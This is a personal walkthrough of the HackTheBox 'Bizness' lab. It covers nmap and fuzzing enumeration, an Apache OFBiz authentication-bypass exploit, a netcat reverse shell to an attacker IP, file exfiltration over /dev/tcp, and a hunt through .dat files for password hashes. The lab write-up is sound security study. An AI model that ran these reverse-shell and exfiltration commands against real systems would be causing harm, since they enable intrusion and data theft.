# Enumeration

Starting with nmap
`sudo nmap -Pn -sV -sC 10.10.11.252`

We see that ports 22, 80, and 443 are open.

22 is for ssh as usual

80 seems to be some sort of web server

And 443 seems to be the same.

They both redirect to https://bizness.htb/

Adding it to /etc/hosts:
`echo '10.10.11.252 bizness.htb' | sudo tee -a /etc/hosts`

Opening th page it mentions an invalid cert.
Seems to be related to the fact it doesn't provide ownership info so it doesn't matter probably.

This is literally a one page site. And the only two things I see are interactable are the contact form and the subscribe button. 

This feels like input sanatization. Maybe SQL Injection?

Literally nothing but the subscribe button on the page does anything. 

It does do validation to make sure its an email. But seems to be client side. Maybe I can modify the input and try here?

Wait, it looks like contact form actually has a disabled attribute. But I can change that and run it. This may actually be it.

It sends a post with the data.

Maybe I can run this through sqlmap.

```
sqlmap 'https://bizness.htb/contactform/contactform.php' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'cookie: JSESSIONID=FA2E079C98C543CB0284B8EEFBF7D52F.jvm1' \
  -H 'origin: https://bizness.htb' \
  -H 'priority: u=1, i' \
  -H 'referer: https://bizness.htb/' \
  -H 'sec-ch-ua: "Chromium";v="123", "Not:A-Brand";v="8"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "macOS"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36' \
  -H 'x-requested-with: XMLHttpRequest' \
  --data-raw 'name=adaaada&email=test%40email.com&subject=adad&message=test' \
  --level=5 --risk=3
```

Maybe I can run this through the Zap webpage analyzer...

Interesting when I ran an active scan on the site it says theres a sqlite injection. SQLMap is still running. It might find it for me. Guess my instinct was correct.

The suggest payload is something like `case randomblob(1000000) when not null then 1 else 1 end` which seems to be a time based attack of some kind. I believe I can modify the sqlmap search to test for time based injections.

--technique=T says only look for timebased blind.

Killing sqlmap and trying that. 

SQLMap didn't find anything. This appears to be a false positive. 

There are other possible injections. Gonna run site map discovery, then try some of those.

First I am going to run a directory fuzz:
`ffuf -w ../../HackTheBox/Modules/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u https://bizness.htb/FUZZ -fs 169`

Doesn't seem there are any other directories, and all calls redirect to the original page. I see in the linked javascript file for the contact form it is supposed to call `contactform/contactform.php`. Which means contactform should be a directory, but that also redirects to the main page. But this does give a hint that maybe the back end server is php. So I am going to fuzz for that next.

`ffuf -w ../../HackTheBox/Modules/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u https://bizness.htb/FUZZ.php -fs 0 -ic` (-ic is for ignore copywrite)

This didn't find anything. After looking at the forums a bit I see that this is related to some CVE. When I look at the page I see that Apache OFBiz is used. A quick google search reveals (this)[https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/tree/master]. 

This seems to work. Now I need to get a reverse shell going.

Looking at (this webpage)[https://medium.com/@cuncis/reverse-shell-cheat-sheet-creating-and-using-reverse-shells-for-penetration-testing-and-security-d25a6923362e] I see a bunch of reverse shells to try.

So I started a netcat listener on 2222 with `nc -lnvp 2222`.
Then I ran `python3 exploit.py --url https://bizness.htb --cmd "nc -e /bin/sh 10.10.14.147 2222"` and it started a reverse shell.

Then something I ran something I learned on the Codify box to get a prettier output.

Now I have a foothold.

For a pretty shell.
```
script /dev/null -qc /bin/bash
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

# Foothold

Running `cat /etc/passwd` I don't see any suspicous users.

Running `find -name '*user.txt' 2>/dev/null` finds the user flags

So running `cat /home/ofbiz/user.txt` gets the first flag.

Now how to privesc.

Running `find -name '*.db' 2>/dev/null` shows a bunch of dbs but none of them seem to be what I want.

I found one I wanted to try and read locally.

To do this I start a netcat locally with `nc -lvnp 4444 > listchanges.db`

Then I run `cat /var/lib/apt/listchanges.db > /dev/tcp/10.10.14.147/4444`

I found (this page)[https://stackoverflow.com/questions/37644/examining-berkeley-db-files-from-the-cli] for working Berkley DB.

This was a red herring.

Discussion posts seem to indicate the trick here is the dat files.

I can find all dat files with `find / -name '*.dat' 2>/dev/null`.

There are a ton. So maybe I can use `find / -name '*.dat' 2>/dev/null | xargs grep -i 'Password'` to narrow it down.

It matches a few binary files.

Turns out c54d0.dat contains the current password in Sha form.

`cat /opt/ofbiz/runtime/data/derby/ofbiz/seg0/c54d0.dat`

So what I gather from the password is we have to create our own hashing function match it. I did find a matching function online for this. I could be offbase, but rooting this box did not feel like it fit into the easy category.
